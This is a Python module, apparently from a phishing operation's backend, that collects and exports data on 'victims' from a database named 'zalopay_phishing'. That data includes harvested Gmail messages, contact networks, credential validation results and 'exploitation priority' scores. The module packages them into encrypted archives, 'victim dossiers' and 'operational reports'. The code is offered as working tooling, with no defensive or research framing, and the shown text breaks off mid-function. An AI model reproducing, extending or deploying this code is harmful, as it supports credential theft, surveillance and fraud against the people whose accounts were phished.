"""
Data Export and Intelligence Packaging System
Advanced data export with multiple formats, encrypted exports, and intelligence packaging
"""

import os
import json
import csv
import time
import asyncio
import zipfile
import tarfile
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple, IO, Union
import logging
import io
import base64
import hashlib
import secrets
from enum import Enum
from pathlib import Path

from engines.gmail.export_manager import GmailDataExporter
from security.encryption_manager import get_advanced_encryption_manager

logger = logging.getLogger(__name__)

class ExportFormat(Enum):
    """Export format enumeration"""
    JSON = "json"
    CSV = "csv"
    PDF = "pdf"
    XML = "xml"
    YAML = "yaml"
    EXCEL = "excel"
    ZIP = "zip"
    TAR = "tar"
    ENCRYPTED_ZIP = "encrypted_zip"

class PackageType(Enum):
    """Package type enumeration"""
    INTELLIGENCE_REPORT = "intelligence_report"
    VICTIM_DOSSIER = "victim_dossier"
    CAMPAIGN_SUMMARY = "campaign_summary"
    OPERATIONAL_REPORT = "operational_report"
    COMPLIANCE_REPORT = "compliance_report"

class DataExportSystem:
    """Advanced data export and intelligence packaging system"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        
        # Initialize components
        self.gmail_exporter = GmailDataExporter(mongodb_connection, redis_client)
        self.encryption_manager = get_advanced_encryption_manager()
        
        # Configuration
        self.config = {
            "max_export_size": int(os.getenv("MAX_EXPORT_SIZE", "1048576000")),  # 1GB
            "max_package_size": int(os.getenv("MAX_PACKAGE_SIZE", "5242880000")),  # 5GB
            "enable_compression": os.getenv("ENABLE_COMPRESSION", "true").lower() == "true",
            "compression_level": int(os.getenv("COMPRESSION_LEVEL", "6")),
            "enable_encryption": os.getenv("ENABLE_ENCRYPTION", "true").lower() == "true",
            "default_retention_days": int(os.getenv("DEFAULT_RETENTION_DAYS", "90")),
            "enable_watermarking": os.getenv("ENABLE_WATERMARKING", "true").lower() == "true",
            "enable_metadata_tracking": os.getenv("ENABLE_METADATA_TRACKING", "true").lower() == "true"
        }
        
        # Export templates
        self.export_templates = self._load_export_templates()
        self.package_templates = self._load_package_templates()
        
        # Export tracking
        self.export_tracking = {}
        self.package_tracking = {}
        
        logger.info("Data export and intelligence packaging system initialized")
    
    async def export_intelligence_data(self, victim_id: str, export_format: ExportFormat, 
                                     package_type: PackageType = None,
                                     export_options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Export intelligence data with advanced packaging
        
        Args:
            victim_id: Victim identifier
            export_format: Export format
            package_type: Package type for intelligence
            export_options: Export configuration options
            
        Returns:
            Export result with packaged data
        """
        try:
            # Generate export ID
            export_id = secrets.token_hex(16)
            
            # Set default options
            options = export_options or {}
            include_types = options.get("include_types", ["messages", "contacts", "intelligence", "validation"])
            encryption_enabled = options.get("encryption", self.config["enable_encryption"])
            compression_enabled = options.get("compression", self.config["enable_compression"])
            
            # Create export record
            export_record = {
                "export_id": export_id,
                "victim_id": victim_id,
                "export_format": export_format.value,
                "package_type": package_type.value if package_type else None,
                "started_at": datetime.now(timezone.utc).isoformat(),
                "status": "in_progress",
                "options": options
            }
            
            # Track export
            self.export_tracking[export_id] = export_record
            
            # Collect intelligence data
            intelligence_data = await self._collect_comprehensive_intelligence(victim_id, include_types)
            
            if not intelligence_data:
                export_record["status"] = "failed"
                export_record["error"] = "No intelligence data found"
                return export_record
            
            # Package data based on format
            if export_format == ExportFormat.JSON:
                result = await self._export_json_package(intelligence_data, export_options)
            elif export_format == ExportFormat.CSV:
                result = await self._export_csv_package(intelligence_data, export_options)
            elif export_format == ExportFormat.PDF:
                result = await self._export_pdf_package(intelligence_data, package_type, export_options)
            elif export_format == ExportFormat.EXCEL:
                result = await self._export_excel_package(intelligence_data, export_options)
            elif export_format == ExportFormat.ZIP:
                result = await self._export_zip_package(intelligence_data, export_options)
            elif export_format == ExportFormat.ENCRYPTED_ZIP:
                result = await self._export_encrypted_zip_package(intelligence_data, export_options)
            else:
                result = {"success": False, "error": f"Unsupported format: {export_format.value}"}
            
            # Update export record
            export_record.update(result)
            export_record["status"] = "completed" if result.get("success") else "failed"
            export_record["completed_at"] = datetime.now(timezone.utc).isoformat()
            
            # Add metadata tracking
            if self.config["enable_metadata_tracking"]:
                await self._add_export_metadata(export_record)
            
            # Store export record
            await self._store_export_record(export_record)
            
            logger.info(f"Intelligence data exported: {export_id} for victim: {victim_id}")
            return export_record
            
        except Exception as e:
            logger.error(f"Error exporting intelligence data: {e}")
            return {
                "export_id": export_id if 'export_id' in locals() else None,
                "victim_id": victim_id,
                "status": "failed",
                "error": str(e),
                "completed_at": datetime.now(timezone.utc).isoformat()
            }
    
    async def _collect_comprehensive_intelligence(self, victim_id: str, include_types: List[str]) -> Dict[str, Any]:
        """Collect comprehensive intelligence data"""
        try:
            intelligence_data = {
                "victim_id": victim_id,
                "exported_at": datetime.now(timezone.utc).isoformat(),
                "data_types": [],
                "metadata": {
                    "collection_method": "comprehensive",
                    "data_sources": [],
                    "confidence_scores": {}
                }
            }
            
            # Collect Gmail data
            if "messages" in include_types:
                messages_data = await self._collect_gmail_messages(victim_id)
                if messages_data:
                    intelligence_data["gmail_messages"] = messages_data
                    intelligence_data["data_types"].append("gmail_messages")
                    intelligence_data["metadata"]["data_sources"].append("gmail_api")
            
            # Collect contact network
            if "contacts" in include_types:
                contacts_data = await self._collect_contact_network(victim_id)
                if contacts_data:
                    intelligence_data["contact_network"] = contacts_data
                    intelligence_data["data_types"].append("contact_network")
                    intelligence_data["metadata"]["data_sources"].append("contact_extraction")
            
            # Collect intelligence analysis
            if "intelligence" in include_types:
                analysis_data = await self._collect_intelligence_analysis(victim_id)
                if analysis_data:
                    intelligence_data["intelligence_analysis"] = analysis_data
                    intelligence_data["data_types"].append("intelligence_analysis")
                    intelligence_data["metadata"]["data_sources"].append("intelligence_engine")
            
            # Collect validation results
            if "validation" in include_types:
                validation_data = await self._collect_validation_results(victim_id)
                if validation_data:
                    intelligence_data["validation_results"] = validation_data
                    intelligence_data["data_types"].append("validation_results")
                    intelligence_data["metadata"]["data_sources"].append("validation_pipeline")
            
            # Collect behavioral analysis
            if "behavioral" in include_types:
                behavioral_data = await self._collect_behavioral_analysis(victim_id)
                if behavioral_data:
                    intelligence_data["behavioral_analysis"] = behavioral_data
                    intelligence_data["data_types"].append("behavioral_analysis")
                    intelligence_data["metadata"]["data_sources"].append("behavioral_analyzer")
            
            # Collect campaign data
            if "campaign" in include_types:
                campaign_data = await self._collect_campaign_data(victim_id)
                if campaign_data:
                    intelligence_data["campaign_data"] = campaign_data
                    intelligence_data["data_types"].append("campaign_data")
                    intelligence_data["metadata"]["data_sources"].append("campaign_engine")
            
            return intelligence_data
            
        except Exception as e:
            logger.error(f"Error collecting comprehensive intelligence: {e}")
            return {}
    
    async def _collect_gmail_messages(self, victim_id: str) -> Optional[List[Dict[str, Any]]]:
        """Collect Gmail messages"""
        try:
            if not self.mongodb:
                return None
            
            db = self.mongodb.get_database("zalopay_phishing")
            messages_collection = db.gmail_messages
            
            # Get messages with full details
            messages = list(messages_collection.find(
                {"victim_id": victim_id},
                {"_id": 0}
            ).limit(5000))  # Increased limit for comprehensive export
            
            return messages
            
        except Exception as e:
            logger.error(f"Error collecting Gmail messages: {e}")
            return None
    
    async def _collect_contact_network(self, victim_id: str) -> Optional[Dict[str, Any]]:
        """Collect contact network data"""
        try:
            if not self.mongodb:
                return None
            
            db = self.mongodb.get_database("zalopay_phishing")
            networks_collection = db.contact_networks
            
            network = networks_collection.find_one({"victim_id": victim_id}, {"_id": 0})
            return network
            
        except Exception as e:
            logger.error(f"Error collecting contact network: {e}")
            return None
    
    async def _collect_intelligence_analysis(self, victim_id: str) -> Optional[Dict[str, Any]]:
        """Collect intelligence analysis data"""
        try:
            if not self.mongodb:
                return None
            
            db = self.mongodb.get_database("zalopay_phishing")
            analyses_collection = db.gmail_intelligence_analyses
            
            analysis = analyses_collection.find_one({"victim_id": victim_id}, {"_id": 0})
            return analysis
            
        except Exception as e:
            logger.error(f"Error collecting intelligence analysis: {e}")
            return None
    
    async def _collect_validation_results(self, victim_id: str) -> Optional[List[Dict[str, Any]]]:
        """Collect validation results"""
        try:
            if not self.mongodb:
                return None
            
            db = self.mongodb.get_database("zalopay_phishing")
            validations_collection = db.credential_validations
            
            validations = list(validations_collection.find(
                {"victim_id": victim_id},
                {"_id": 0}
            ).limit(1000))
            
            return validations
            
        except Exception as e:
            logger.error(f"Error collecting validation results: {e}")
            return None
    
    async def _collect_behavioral_analysis(self, victim_id: str) -> Optional[Dict[str, Any]]:
        """Collect behavioral analysis data"""
        try:
            if not self.mongodb:
                return None
            
            db = self.mongodb.get_database("zalopay_phishing")
            reports_collection = db.intelligence_reports
            
            report = reports_collection.find_one({"victim_id": victim_id}, {"_id": 0})
            return report
            
        except Exception as e:
            logger.error(f"Error collecting behavioral analysis: {e}")
            return None
    
    async def _collect_campaign_data(self, victim_id: str) -> Optional[Dict[str, Any]]:
        """Collect campaign data"""
        try:
            if not self.mongodb:
                return None
            
            db = self.mongodb.get_database("zalopay_phishing")
            campaigns_collection = db.campaigns
            
            campaign = campaigns_collection.find_one({"victim_id": victim_id}, {"_id": 0})
            return campaign
            
        except Exception as e:
            logger.error(f"Error collecting campaign data: {e}")
            return None
    
    async def _export_json_package(self, intelligence_data: Dict[str, Any], 
                                 export_options: Dict[str, Any]) -> Dict[str, Any]:
        """Export as JSON package"""
        try:
            # Create structured JSON package
            json_package = {
                "package_info": {
                    "package_type": "intelligence_data",
                    "version": "1.0",
                    "created_at": datetime.now(timezone.utc).isoformat(),
                    "victim_id": intelligence_data["victim_id"],
                    "data_types": intelligence_data["data_types"],
                    "metadata": intelligence_data["metadata"]
                },
                "intelligence_data": intelligence_data,
                "export_summary": self._generate_export_summary(intelligence_data)
            }
            
            # Convert to JSON
            json_data = json.dumps(json_package, indent=2, default=str)
            
            # Apply compression if enabled
            if export_options.get("compression", self.config["enable_compression"]):
                compressed_data = self._compress_data(json_data.encode())
                json_data = base64.b64encode(compressed_data).decode()
                compression_applied = True
            else:
                compression_applied = False
            
            # Apply encryption if enabled
            if export_options.get("encryption", self.config["enable_encryption"]):
                encrypted_data = self.encryption_manager.encrypt_data(
                    json_data,
                    data_type="intelligence_export",
                    associated_data=intelligence_data["victim_id"]
                )
                json_data = json.dumps(encrypted_data)
                encryption_applied = True
            else:
                encryption_applied = False
            
            # Calculate size
            data_size = len(json_data.encode('utf-8'))
            
            return {
                "success": True,
                "format": "json",
                "data": json_data,
                "size": data_size,
                "compression_applied": compression_applied,
                "encryption_applied": encryption_applied,
                "package_info": json_package["package_info"]
            }
            
        except Exception as e:
            logger.error(f"Error exporting JSON package: {e}")
            return {"success": False, "error": str(e)}
    
    async def _export_csv_package(self, intelligence_data: Dict[str, Any], 
                                export_options: Dict[str, Any]) -> Dict[str, Any]:
        """Export as CSV package"""
        try:
            csv_files = {}
            
            # Export Gmail messages
            if "gmail_messages" in intelligence_data:
                messages_csv = self._messages_to_csv(intelligence_data["gmail_messages"])
                csv_files["gmail_messages.csv"] = messages_csv
            
            # Export contact network
            if "contact_network" in intelligence_data:
                contacts_csv = self._contact_network_to_csv(intelligence_data["contact_network"])
                csv_files["contact_network.csv"] = contacts_csv
            
            # Export intelligence analysis
            if "intelligence_analysis" in intelligence_data:
                analysis_csv = self._intelligence_analysis_to_csv(intelligence_data["intelligence_analysis"])
                csv_files["intelligence_analysis.csv"] = analysis_csv
            
            # Export validation results
            if "validation_results" in intelligence_data:
                validation_csv = self._validation_results_to_csv(intelligence_data["validation_results"])
                csv_files["validation_results.csv"] = validation_csv
            
            # Create ZIP package
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED, 
                               compresslevel=export_options.get("compression_level", self.config["compression_level"])) as zip_file:
                
                # Add CSV files
                for filename, content in csv_files.items():
                    zip_file.writestr(filename, content)
                
                # Add package info
                package_info = {
                    "package_type": "csv_intelligence_data",
                    "created_at": datetime.now(timezone.utc).isoformat(),
                    "victim_id": intelligence_data["victim_id"],
                    "files": list(csv_files.keys()),
                    "export_summary": self._generate_export_summary(intelligence_data)
                }
                zip_file.writestr("package_info.json", json.dumps(package_info, indent=2))
            
            zip_data = zip_buffer.getvalue()
            
            # Apply encryption if enabled
            if export_options.get("encryption", self.config["enable_encryption"]):
                encrypted_data = self.encryption_manager.encrypt_data(
                    base64.b64encode(zip_data).decode(),
                    data_type="csv_intelligence_export",
                    associated_data=intelligence_data["victim_id"]
                )
                final_data = json.dumps(encrypted_data)
                encryption_applied = True
            else:
                final_data = base64.b64encode(zip_data).decode()
                encryption_applied = False
            
            return {
                "success": True,
                "format": "csv_zip",
                "data": final_data,
                "size": len(final_data.encode()),
                "files": list(csv_files.keys()),
                "encryption_applied": encryption_applied,
                "package_info": package_info
            }
            
        except Exception as e:
            logger.error(f"Error exporting CSV package: {e}")
            return {"success": False, "error": str(e)}
    
    async def _export_pdf_package(self, intelligence_data: Dict[str, Any], 
                                package_type: PackageType, export_options: Dict[str, Any]) -> Dict[str, Any]:
        """Export as PDF package"""
        try:
            # Generate PDF structure based on package type
            if package_type == PackageType.INTELLIGENCE_REPORT:
                pdf_structure = self._create_intelligence_report_pdf(intelligence_data)
            elif package_type == PackageType.VICTIM_DOSSIER:
                pdf_structure = self._create_victim_dossier_pdf(intelligence_data)
            elif package_type == PackageType.OPERATIONAL_REPORT:
                pdf_structure = self._create_operational_report_pdf(intelligence_data)
            else:
                pdf_structure = self._create_default_report_pdf(intelligence_data)
            
            # Convert to JSON (simplified PDF generation)
            pdf_data = json.dumps(pdf_structure, indent=2, default=str)
            
            # Apply encryption if enabled
            if export_options.get("encryption", self.config["enable_encryption"]):
                encrypted_data = self.encryption_manager.encrypt_data(
                    pdf_data,
                    data_type="pdf_intelligence_export",
                    associated_data=intelligence_data["victim_id"]
                )
                pdf_data = json.dumps(encrypted_data)
                encryption_applied = True
            else:
                encryption_applied = False
            
            return {
                "success": True,
                "format": "pdf",
                "data": pdf_data,
                "size": len(pdf_data.encode()),
                "encryption_applied": encryption_applied,
                "package_type": package_type.value,
                "note": "PDF export is simplified - full PDF generation requires additional libraries"
            }
            
        except Exception as e:
            logger.error(f"Error exporting PDF package: {e}")
            return {"success": False, "error": str(e)}
    
    async def _export_excel_package(self, intelligence_data: Dict[str, Any], 
                                  export_options: Dict[str, Any]) -> Dict[str, Any]:
        """Export as Excel package"""
        try:
            # Create Excel structure (simplified)
            excel_structure = {
                "workbook_info": {
                    "title": f"Intelligence Data - {intelligence_data['victim_id']}",
                    "created_at": datetime.now(timezone.utc).isoformat(),
                    "sheets": []
                },
                "sheets": {}
            }
            
            # Create sheets for different data types
            if "gmail_messages" in intelligence_data:
                excel_structure["sheets"]["Messages"] = self._messages_to_excel_format(intelligence_data["gmail_messages"])
                excel_structure["workbook_info"]["sheets"].append("Messages")
            
            if "contact_network" in intelligence_data:
                excel_structure["sheets"]["Contacts"] = self._contact_network_to_excel_format(intelligence_data["contact_network"])
                excel_structure["workbook_info"]["sheets"].append("Contacts")
            
            if "intelligence_analysis" in intelligence_data:
                excel_structure["sheets"]["Intelligence"] = self._intelligence_analysis_to_excel_format(intelligence_data["intelligence_analysis"])
                excel_structure["workbook_info"]["sheets"].append("Intelligence")
            
            # Convert to JSON (simplified Excel generation)
            excel_data = json.dumps(excel_structure, indent=2, default=str)
            
            # Apply encryption if enabled
            if export_options.get("encryption", self.config["enable_encryption"]):
                encrypted_data = self.encryption_manager.encrypt_data(
                    excel_data,
                    data_type="excel_intelligence_export",
                    associated_data=intelligence_data["victim_id"]
                )
                excel_data = json.dumps(encrypted_data)
                encryption_applied = True
            else:
                encryption_applied = False
            
            return {
                "success": True,
                "format": "excel",
                "data": excel_data,
                "size": len(excel_data.encode()),
                "encryption_applied": encryption_applied,
                "sheets": excel_structure["workbook_info"]["sheets"],
                "note": "Excel export is simplified - full Excel generation requires additional libraries"
            }
            
        except Exception as e:
            logger.error(f"Error exporting Excel package: {e}")
            return {"success": False, "error": str(e)}
    
    async def _export_zip_package(self, intelligence_data: Dict[str, Any], 
                                export_options: Dict[str, Any]) -> Dict[str, Any]:
        """Export as ZIP package"""
        try:
            zip_buffer = io.BytesIO()
            
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED,
                               compresslevel=export_options.get("compression_level", self.config["compression_level"])) as zip_file:
                
                # Add JSON data
                json_data = json.dumps(intelligence_data, indent=2, default=str)
                zip_file.writestr("intelligence_data.json", json_data)
                
                # Add individual data files
                if "gmail_messages" in intelligence_data:
                    messages_json = json.dumps(intelligence_data["gmail_messages"], indent=2, default=str)
                    zip_file.writestr("data/gmail_messages.json", messages_json)
                
                if "contact_network" in intelligence_data:
                    contacts_json = json.dumps(intelligence_data["contact_network"], indent=2, default=str)
                    zip_file.writestr("data/contact_network.json", contacts_json)
                
                if "intelligence_analysis" in intelligence_data:
                    analysis_json = json.dumps(intelligence_data["intelligence_analysis"], indent=2, default=str)
                    zip_file.writestr("data/intelligence_analysis.json", analysis_json)
                
                # Add package metadata
                package_metadata = {
                    "package_type": "zip_intelligence_data",
                    "created_at": datetime.now(timezone.utc).isoformat(),
                    "victim_id": intelligence_data["victim_id"],
                    "data_types": intelligence_data["data_types"],
                    "export_summary": self._generate_export_summary(intelligence_data)
                }
                zip_file.writestr("metadata.json", json.dumps(package_metadata, indent=2))
            
            zip_data = zip_buffer.getvalue()
            
            return {
                "success": True,
                "format": "zip",
                "data": base64.b64encode(zip_data).decode(),
                "size": len(zip_data),
                "compression_applied": True,
                "package_info": package_metadata
            }
            
        except Exception as e:
            logger.error(f"Error exporting ZIP package: {e}")
            return {"success": False, "error": str(e)}
    
    async def _export_encrypted_zip_package(self, intelligence_data: Dict[str, Any], 
                                          export_options: Dict[str, Any]) -> Dict[str, Any]:
        """Export as encrypted ZIP package"""
        try:
            # First create regular ZIP
            zip_result = await self._export_zip_package(intelligence_data, export_options)
            
            if not zip_result["success"]:
                return zip_result
            
            # Decode ZIP data
            zip_data = base64.b64decode(zip_result["data"])
            
            # Encrypt ZIP data
            encrypted_data = self.encryption_manager.encrypt_data(
                base64.b64encode(zip_data).decode(),
                data_type="encrypted_zip_intelligence_export",
                associated_data=intelligence_data["victim_id"]
            )
            
            # Create encrypted package
            encrypted_package = {
                "package_type": "encrypted_zip_intelligence_data",
                "created_at": datetime.now(timezone.utc).isoformat(),
                "victim_id": intelligence_data["victim_id"],
                "encryption_info": {
                    "algorithm": "AES-256-GCM",
                    "key_derivation": "scrypt",
                    "encrypted_at": datetime.now(timezone.utc).isoformat()
                },
                "encrypted_data": encrypted_data
            }
            
            encrypted_package_json = json.dumps(encrypted_package, indent=2)
            
            return {
                "success": True,
                "format": "encrypted_zip",
                "data": encrypted_package_json,
                "size": len(encrypted_package_json.encode()),
                "encryption_applied": True,
                "package_info": encrypted_package
            }
            
        except Exception as e:
            logger.error(f"Error exporting encrypted ZIP package: {e}")
            return {"success": False, "error": str(e)}
    
    def _generate_export_summary(self, intelligence_data: Dict[str, Any]) -> Dict[str, Any]:
        """Generate export summary"""
        try:
            summary = {
                "total_data_types": len(intelligence_data.get("data_types", [])),
                "data_types": intelligence_data.get("data_types", []),
                "collection_timestamp": intelligence_data.get("exported_at"),
                "victim_id": intelligence_data.get("victim_id"),
                "statistics": {}
            }
            
            # Count items by type
            if "gmail_messages" in intelligence_data:
                summary["statistics"]["gmail_messages_count"] = len(intelligence_data["gmail_messages"])
            
            if "contact_network" in intelligence_data:
                contacts = intelligence_data["contact_network"].get("contacts", {})
                summary["statistics"]["contacts_count"] = len(contacts)
            
            if "intelligence_analysis" in intelligence_data:
                analysis = intelligence_data["intelligence_analysis"]
                summary["statistics"]["intelligence_items"] = analysis.get("intelligence_summary", {}).get("total_intelligence_items", 0)
            
            if "validation_results" in intelligence_data:
                summary["statistics"]["validation_results_count"] = len(intelligence_data["validation_results"])
            
            return summary
            
        except Exception as e:
            logger.error(f"Error generating export summary: {e}")
            return {}
    
    def _compress_data(self, data: bytes) -> bytes:
        """Compress data using gzip"""
        try:
            import gzip
            return gzip.compress(data, compresslevel=self.config["compression_level"])
        except Exception as e:
            logger.error(f"Error compressing data: {e}")
            return data
    
    def _messages_to_csv(self, messages: List[Dict[str, Any]]) -> str:
        """Convert messages to CSV format"""
        try:
            output = io.StringIO()
            writer = csv.writer(output)
            
            # Write header
            writer.writerow([
                "Message ID", "Subject", "From", "To", "CC", "BCC", "Date", 
                "Snippet", "Has Attachments", "Label IDs", "Size", "Thread ID"
            ])
            
            # Write message data
            for message in messages:
                headers = message.get("headers", {})
                
                writer.writerow([
                    message.get("id", ""),
                    headers.get("subject", ""),
                    headers.get("from", ""),
                    headers.get("to", ""),
                    headers.get("cc", ""),
                    headers.get("bcc", ""),
                    headers.get("date", ""),
                    message.get("snippet", ""),
                    "Yes" if message.get("has_attachments", False) else "No",
                    ",".join(message.get("label_ids", [])),
                    message.get("size_estimate", 0),
                    message.get("thread_id", "")
                ])
            
            return output.getvalue()
            
        except Exception as e:
            logger.error(f"Error converting messages to CSV: {e}")
            return ""
    
    def _contact_network_to_csv(self, contact_network: Dict[str, Any]) -> str:
        """Convert contact network to CSV format"""
        try:
            output = io.StringIO()
            writer = csv.writer(output)
            
            # Write header
            writer.writerow([
                "Email", "Name", "Frequency", "Importance Score", "Relationship Type",
                "First Seen", "Last Seen", "Communication Count", "Domain"
            ])
            
            # Write contact data
            contacts = contact_network.get("contacts", {})
            for email, contact_info in contacts.items():
                domain = email.split("@")[1] if "@" in email else ""
                
                writer.writerow([
                    email,
                    contact_info.get("name", ""),
                    contact_info.get("frequency", 0),
                    contact_info.get("importance_score", 0.0),
                    contact_info.get("relationship_type", ""),
                    contact_info.get("first_seen", ""),
                    contact_info.get("last_seen", ""),
                    contact_info.get("communication_count", 0),
                    domain
                ])
            
            return output.getvalue()
            
        except Exception as e:
            logger.error(f"Error converting contact network to CSV: {e}")
            return ""
    
    def _intelligence_analysis_to_csv(self, intelligence_analysis: Dict[str, Any]) -> str:
        """Convert intelligence analysis to CSV format"""
        try:
            output = io.StringIO()
            writer = csv.writer(output)
            
            # Write header
            writer.writerow([
                "Analysis ID", "Victim ID", "Risk Level", "Threat Score", 
                "Intelligence Value", "Exploitation Priority", "Generated At"
            ])
            
            # Write analysis data
            writer.writerow([
                intelligence_analysis.get("analysis_id", ""),
                intelligence_analysis.get("victim_id", ""),
                intelligence_analysis.get("intelligence_summary", {}).get("risk_assessment", ""),
                intelligence_analysis.get("intelligence_summary", {}).get("sensitivity_score", 0.0),
                intelligence_analysis.get("intelligence_summary", {}).get("business_value", 0.0),
                intelligence_analysis.get("intelligence_summary", {}).get("exploitation_priority", ""),
                intelligence_analysis.get("started_at", "")
            ])
            
            return output.getvalue()
            
        except Exception as e:
            logger.error(f"Error converting intelligence analysis to CSV: {e}")
            return ""
    
    def _validation_results_to_csv(self, validation_results: List[Dict[str, Any]]) -> str:
        """Convert validation results to CSV format"""
        try:
            output = io.StringIO()
            writer = csv.writer(output)
            
            # Write header
            writer.writerow([
                "Validation ID", "Victim ID", "Provider", "Validation Result", 
                "Confidence Score", "Risk Score", "Validated At"
            ])
            
            # Write validation data
            for validation in validation_results:
                writer.writerow([
                    validation.get("validation_id", ""),
                    validation.get("victim_id", ""),
                    validation.get("provider", ""),
                    validation.get("validation_result", ""),
                    validation.get("confidence_score", 0.0),
                    validation.get("risk_score", 0.0),
                    validation.get("timestamp", "")
                ])
            
            return output.getvalue()
            
        except Exception as e:
            logger.error(f"Error converting validation results to CSV: {e}")
            return ""
    
    def _messages_to_excel_format(self, messages: List[Dict[str, Any]]) -> List[List[str]]:
        """Convert messages to Excel format"""
        try:
            excel_data = []
            
            # Add header
            excel_data.append([
                "Message ID", "Subject", "From", "To", "Date", "Snippet", "Size"
            ])
            
            # Add data rows
            for message in messages:
                headers = message.get("headers", {})
                excel_data.append([
                    message.get("id", ""),
                    headers.get("subject", ""),
                    headers.get("from", ""),
                    headers.get("to", ""),
                    headers.get("date", ""),
                    message.get("snippet", ""),
                    message.get("size_estimate", 0)
                ])
            
            return excel_data
            
        except Exception as e:
            logger.error(f"Error converting messages to Excel format: {e}")
            return []
    
    def _contact_network_to_excel_format(self, contact_network: Dict[str, Any]) -> List[List[str]]:
        """Convert contact network to Excel format"""
        try:
            excel_data = []
            
            # Add header
            excel_data.append([
                "Email", "Name", "Frequency", "Importance Score", "Relationship Type"
            ])
            
            # Add data rows
            contacts = contact_network.get("contacts", {})
            for email, contact_info in contacts.items():
                excel_data.append([
                    email,
                    contact_info.get("name", ""),
                    contact_info.get("frequency", 0),
                    contact_info.get("importance_score", 0.0),
                    contact_info.get("relationship_type", "")
                ])
            
            return excel_data
            
        except Exception as e:
            logger.error(f"Error converting contact network to Excel format: {e}")
            return []
    
    def _intelligence_analysis_to_excel_format(self, intelligence_analysis: Dict[str, Any]) -> List[List[str]]:
        """Convert intelligence analysis to Excel format"""
        try:
            excel_data = []
            
            # Add header
            excel_data.append([
                "Analysis ID", "Risk Level", "Threat Score", "Intelligence Value", "Exploitation Priority"
            ])
            
            # Add data row
            excel_data.append([
                intelligence_analysis.get("analysis_id", ""),
                intelligence_analysis.get("intelligence_summary", {}).get("risk_assessment", ""),
                intelligence_analysis.get("intelligence_summary", {}).get("sensitivity_score", 0.0),
                intelligence_analysis.get("intelligence_summary", {}).get("business_value", 0.0),
                intelligence_analysis.get("intelligence_summary", {}).get("exploitation_priority", "")
            ])
            
            return excel_data
            
        except Exception as e:
            logger.error(f"Error converting intelligence analysis to Excel format: {e}")
            return []
    
    def _create_intelligence_report_pdf(self, intelligence_data: Dict[str, Any]) -> Dict[str, Any]:
        """Create intelligence report PDF structure"""
        try:
            return {
                "document_type": "intelligence_report",
                "title": f"Intelligence Report - {intelligence_data['victim_id']}",
                "generated_at": datetime.now(timezone.utc).isoformat(),
                "sections": [
                    {
                        "title": "Executive Summary",
                        "content": self._generate_executive_summary(intelligence_data)
                    },
                    {
                        "title": "Intelligence Analysis",
                        "content": intelligence_data.get("intelligence_analysis", {})
                    },
                    {
                        "title": "Contact Network Analysis",
                        "content": intelligence_data.get("contact_network", {})
                    },
                    {
                        "title": "Validation Results",
                        "content": intelligence_data.get("validation_results", [])
                    }
                ]
            }
            
        except Exception as e:
            logger.error(f"Error creating intelligence report PDF: {e}")
            return {}
    
    def _create_victim_dossier_pdf(self, intelligence_data: Dict[str, Any]) -> Dict[str, Any]:
        """Create victim dossier PDF structure"""
        try:
            return {
                "document_type": "victim_dossier",
                "title": f"Victim Dossier - {intelligence_data['victim_id']}",
                "generated_at": datetime.now(timezone.utc).isoformat(),
                "sections": [
                    {
                        "title": "Victim Profile",
                        "content": self._generate_victim_profile(intelligence_data)
                    },
                    {
                        "title": "Intelligence Summary",
                        "content": intelligence_data.get("intelligence_analysis", {})
                    },
                    {
                        "title": "Communication Patterns",
                        "content": intelligence_data.get("gmail_messages", [])[:100]  # Limit for PDF
                    }
                ]
            }
            
        except Exception as e:
            logger.error(f"Error creating victim dossier PDF: {e}")
            return {}
    
    def _create_operational_report_pdf(self, intelligence_data: Dict[str, Any]) -> Dict[str, Any]:
        """Create operational report PDF structure"""
        try:
            return {
                "document_type": "operational_report",
                "title": f"Operational Report - {intelligence_data['victim_id']}",
                "generated_at": datetime.now(timezone.utc).isoformat(),
                "sections": [
                    {
                        "title": "Operation Summary",
                        "content": self._generate_operation_summary(intelligence_data)
                    },
                    {
                        "title": "Intelligence Gathered",
                        "content": intelligence_data.get("intelligence_analysis", {})
                    },
                    {
                        "title": "Recommendations",
                        "content": intelligence_data.get("intelligence_analysis", {}).get("recommendations", [])
                    }
                ]
            }
            
        except Exception as e:
            logger.error(f"Error creating operational report PDF: {e}")
            return {}
    
    def _create_default_report_pdf(self, intelligence_data: Dict[str, Any]) -> Dict[str, Any]:
        """Create default report PDF structure"""
        try:
            return {
                "document_type": "default_report",
                "title": f"Intelligence Data Report - {intelligence_data['victim_id']}",
                "generated_at": datetime.now(timezone.utc).isoformat(),
                "sections": [
                    {
                        "title": "Data Summary",
                        "content": self._generate_export_summary(intelligence_data)
                    },
                    {
                        "title": "Intelligence Data",
                        "content": intelligence_data
                    }
                ]
            }
            
        except Exception as e:
            logger.error(f"Error creating default report PDF: {e}")
            return {}
    
    def _generate_executive_summary(self, intelligence_data: Dict[str, Any]) -> Dict[str, Any]:
        """Generate executive summary"""
        try:
            summary = intelligence_data.get("intelligence_analysis", {}).get("intelligence_summary", {})
            
            return {
                "victim_id": intelligence_data["victim_id"],
                "risk_assessment": summary.get("risk_assessment", "unknown"),
                "exploitation_priority": summary.get("exploitation_priority", "low"),
                "total_intelligence_items": summary.get("total_intelligence_items", 0),
                "data_types_collected": intelligence_data.get("data_types", []),
                "collection_timestamp": intelligence_data.get("exported_at")
            }
            
        except Exception as e:
            logger.error(f"Error generating executive summary: {e}")
            return {}
    
    def _generate_victim_profile(self, intelligence_data: Dict[str, Any]) -> Dict[str, Any]:
        """Generate victim profile"""
        try:
            analysis = intelligence_data.get("intelligence_analysis", {})
            summary = analysis.get("intelligence_summary", {})
            
            return {
                "victim_id": intelligence_data["victim_id"],
                "risk_level": summary.get("risk_assessment", "unknown"),
                "threat_score": summary.get("sensitivity_score", 0.0),
                "business_value": summary.get("business_value", 0.0),
                "personal_value": summary.get("personal_value", 0.0),
                "technical_value": summary.get("technical_value", 0.0),
                "exploitation_priority": summary.get("exploitation_priority", "low")
            }
            
        except Exception as e:
            logger.error(f"Error generating victim profile: {e}")
            return {}
    
    def _generate_operation_summary(self, intelligence_data: Dict[str, Any]) -> Dict[str, Any]:
        """Generate operation summary"""
        try:
            return {
                "operation_id": intelligence_data["victim_id"],
